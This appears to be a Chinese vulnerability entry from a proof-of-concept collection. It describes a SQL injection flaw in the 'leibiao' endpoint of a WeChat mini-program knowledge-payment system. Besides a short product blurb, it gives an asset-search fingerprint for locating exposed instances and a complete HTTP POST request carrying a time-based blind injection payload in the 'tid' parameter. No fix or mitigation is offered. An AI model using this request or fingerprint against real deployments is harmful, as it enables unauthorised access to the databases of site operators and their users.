# 知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">知识吾爱纯净版小程序系统是一款基于 微信小程序平台开发的知识付费应用，旨在帮助用户快速建立自己的知识付费平台，实现支付变现和流量主收益。它提供了简洁明了的用户界面和良好的用户体验，同时注重用户隐私保护，确保用户信息的安全存储和传输。知识吾爱纯净版小程序系统leibiao存在SQL注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ 知识吾爱纯净版小程序系统

# 三、资产测绘
```plain
body="域名/skdjfdf"
```


# 四、漏洞复现
```plain
POST /app/zm/leibiao HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
 
tid=(CASE WHEN (3711=3711) THEN SLEEP(5) ELSE 3711 END)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/eqt5cie65az0nwn5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
